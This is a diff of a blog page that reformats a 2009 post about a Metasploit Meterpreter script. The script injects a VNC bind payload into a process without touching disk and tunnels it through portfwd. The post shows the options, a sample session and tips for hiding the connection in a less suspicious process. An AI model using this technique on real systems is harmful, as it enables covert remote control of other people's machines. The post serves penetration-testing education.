@@ -31,7 +31,7 @@ By creating a bind payload instead of a reverse connect we can have the payload 
     type="text/css">
 
 
-<link rel="stylesheet" href="https://malicious.link/scss/main.min.099699ab246bf26f50616f7c9f00c79d46110459d1bd727b2d07d6fc09ece082.css">
+<link rel="stylesheet" href="https://malicious.link/scss/main.min.48be1f41dc1d94d27b5663b2b359c895efd7696597f656e57d8f6c0e126c0563.css">
 
 
 
@@ -47,16 +47,13 @@ Looking at the script I noticed that it created a new connection (two connection
 https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb
 Or you can get it via the SVN at Revision 7872
 By creating a bind payload instead of a reverse connect we can have the payload listen locally.">
-
-
 <meta itemprop="datePublished" content="2009-12-15T13:00:37&#43;00:00" />
 <meta itemprop="dateModified" content="2009-12-15T13:00:37&#43;00:00" />
 <meta itemprop="wordCount" content="794">
 
 
 
-<meta itemprop="keywords" content="" />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Meterpreter tunneling and VNC revamped"/>
 <meta name="twitter:description" content="So yesterday (December 14th, 2009) HD Moore posted a tweet with a pic of the new VNC meterpreter script that he wrote:
 Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin.
@@ -137,22 +134,13 @@ By creating a bind payload instead of a reverse connect we can have the payload 
             
 
             <div class="post-content">
-                
-
-<p>So yesterday (December 14th, 2009) <a href="http://twitter.com/hdmoore">HD Moore</a> posted <a href="http://twitter.com/hdmoore/status/6663737357">a tweet</a> with a pic of the new VNC meterpreter script that he wrote:</p>
-
-<p><img src="/images/postimages/200912_vnc_1.png" alt="" /></p>
-
+                <p>So yesterday (December 14th, 2009) <a href="http://twitter.com/hdmoore">HD Moore</a> posted <a href="http://twitter.com/hdmoore/status/6663737357">a tweet</a> with a pic of the new VNC meterpreter script that he wrote:</p>
+<p><img src="/images/postimages/200912_vnc_1.png" alt=""></p>
 <p>Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin.</p>
-
 <p><a href="https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb">https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb</a></p>
-
 <p>Or you can get it via the SVN at <a href="https://metasploit.com/redmine/projects/framework/repository/revisions/7872">Revision 7872</a></p>
-
 <p>By creating a bind payload instead of a reverse connect we can have the payload listen locally. Then with portfwd command (just like on your home router) we forward a local port to the local host on the remote side, to the binded port. Connecting to the freshly bound port as if we were actually doing everything on the box itself. Creating a new session and a nice beautiful VNC window.</p>
-
 <h2 id="options">Options:</h2>
-
 <pre><code>meterpreter &gt; run vnc_oneport -h
 
 OPTIONS:  
@@ -162,10 +150,7 @@ OPTIONS:
 -p &lt;opt&gt; The port on the remote host to bind VNC to (default: randomized)
 
 meterpreter &gt;
-</code></pre>
-
-<h2 id="example-run">Example Run:</h2>
-
+</code></pre><h2 id="example-run">Example Run:</h2>
 <pre><code>[*] Meterpreter session 1 opened (192.168.92.103:4444 -&gt; 192.168.92.113:1038)
 
 meterpreter &gt; **_run vnc_oneport_**
@@ -214,29 +199,23 @@ Using shared memory PutImageSame machine: preferring raw encodingShmCleanup call
 [*] VNC Server session 2 closed.
 
 meterpreter &gt;
-</code></pre>
-
-<h2 id="note">Note:</h2>
-
+</code></pre><h2 id="note">Note:</h2>
 <p>The forwarded port does not close even if the meterpreter session is ended, so use the following command to close the forward:</p>
-
-<p>```
-meterpreter &gt; portfwd delete -l 5901<br />
+<pre><code>meterpreter &gt; portfwd delete -l 5901  
 [*] Successfully stopped TCP relay on 0.0.0.0:5901
-meterpreter &gt;</p>
+meterpreter &gt;
 
-<p>(Note to BT4 users: do a <code>apt-get install vncviewer</code> before using any of the vnc payloads in Metasploit)</p>
+(Note to BT4 users: do a `apt-get install vncviewer` before using any of the vnc payloads in Metasploit)
 
-<p>The script utilizes just one of the millions of way you can leverage &lsquo;portfwd&rsquo; in your endeavors. But where it gets interesting is the fact that the delivery method for the payload never touches disk. That magic is all credited to HD though. What happens is a new process is created (notepad by default) and the newly created VNC bind payload is injected into it. But, the beauty is that it&rsquo;s doing local connections via the port forwarding so all you see in TCPView is:</p>
+The script utilizes just one of the millions of way you can leverage 'portfwd' in your endeavors. But where it gets interesting is the fact that the delivery method for the payload never touches disk. That magic is all credited to HD though. What happens is a new process is created (notepad by default) and the newly created VNC bind payload is injected into it. But, the beauty is that it's doing local connections via the port forwarding so all you see in TCPView is:
 
-<p><img src="/images/postimages/200912_vnc_2.png" alt="" /></p>
+![](/images/postimages/200912_vnc_2.png)
 
-<p>Now it&rsquo;s definitely suspicious that Notepad has any connections at all, but you can use the option <code>-e</code> to provide any executable you wish, as long as it&rsquo;s in the path for the system. For examples, look at what&rsquo;s running naturally already.</p>
+Now it's definitely suspicious that Notepad has any connections at all, but you can use the option `-e` to provide any executable you wish, as long as it's in the path for the system. For examples, look at what's running naturally already.
 
-<p>Plus, you would probably not be using port 4444 for a meterpreter session. But what I wanted to demonstrate with this script is the power of both meterpreter, and port forwarding.</p>
+Plus, you would probably not be using port 4444 for a meterpreter session. But what I wanted to demonstrate with this script is the power of both meterpreter, and port forwarding.
 
-<p>Now it&rsquo;s your turn to make it better. Take a look at the guts, see if anything will help you in your scripting.</p>
-
+Now it's your turn to make it better. Take a look at the guts, see if anything will help you in your scripting.</code></pre>
             </div>
         </article>
 
@@ -257,7 +236,7 @@ meterpreter &gt;</p>
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2019</span>
+            <span>&copy; 2020</span>
             
             <span></span>
             <span> <a href="https://malicious.link/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
